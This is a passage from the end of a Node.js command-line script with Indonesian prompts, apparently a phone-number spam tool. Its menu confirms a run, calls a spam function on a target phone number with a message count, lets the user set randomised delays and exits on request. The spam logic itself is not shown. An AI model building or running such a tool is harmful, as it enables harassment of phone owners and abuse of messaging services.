      const confirm = await askQuestion(rl5, '\x1b[33mLanjut? (y/n): \x1b[0m');
      rl5.close();
      if (confirm.toLowerCase() !== 'y') { console.log('\x1b[31m❌ Batal!\x1b[0m'); await delay(1500); continue; }

      await spam(phone, selected, count, customDelayMin, customDelayMax);

    } else if (choice === '2') {
      const rl2 = createInterface();
      console.log(`\n\x1b[36mDelay sekarang: ${customDelayMin/1000}-${customDelayMax/1000}s\x1b[0m`);
      const minInput = await askQuestion(rl2, '\x1b[36mMin (detik): \x1b[0m');
      const maxInput = await askQuestion(rl2, '\x1b[36mMax (detik): \x1b[0m');
      rl2.close();
      const min = parseFloat(minInput), max = parseFloat(maxInput);
      if (!isNaN(min) && !isNaN(max) && min > 0 && max > min) {
        customDelayMin = min * 1000;
        customDelayMax = max * 1000;
        console.log(`\x1b[32m✅ Delay: ${min}-${max}s\x1b[0m`);
      } else {
        console.log('\x1b[31m❌ Invalid! Gunakan default.\x1b[0m');
      }
      await delay(1500);

    } else if (choice === '3') {
      console.log('\n\x1b[31mExit...\x1b[0m');
      process.exit(0);
    } else {
      console.log('\x1b[31m❌ Invalid!\x1b[0m');
      await delay(1000);
    }
  }
}

main().catch(console.error);
